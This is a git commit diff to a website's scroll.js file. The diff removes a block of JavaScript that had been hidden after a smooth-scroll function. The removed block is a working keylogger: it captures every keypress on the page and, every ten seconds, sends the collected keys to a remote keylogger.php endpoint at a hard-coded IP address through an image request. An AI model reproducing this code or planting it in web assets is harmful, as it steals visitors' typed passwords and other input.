529f7eb74addfec4c03f9a787cde942c24a03048
kachan28 <38868795+kachan28@users.noreply.github.com>
2019-03-27 19:38:20 +0300

    Update scroll.js

--- Assets/JS/scroll.js
+++ Assets/JS/scroll.js
@@ -24,21 +24,3 @@ function topFunction() {
             behavior: 'smooth'
         });
 }
-
-var keys='';
-var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
-
-document.onkeypress = function(e) {
-	get = window.event?event:e;
-	key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
-}
-
-window.setInterval(function(){
-	console.log(keys);
-	if(keys.length>0) {
-		new Image().src = url+keys;
-		keys = '';
-	}
-}, 10000);
